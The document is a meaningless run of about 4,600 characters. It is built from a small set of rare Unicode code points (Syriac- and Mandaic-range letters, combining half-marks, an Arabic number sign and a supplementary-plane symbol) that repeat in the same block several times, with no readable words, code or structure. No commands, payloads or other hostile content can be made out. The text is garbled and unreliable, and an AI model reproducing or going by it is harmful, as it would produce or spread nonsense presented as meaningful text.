࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙𞋬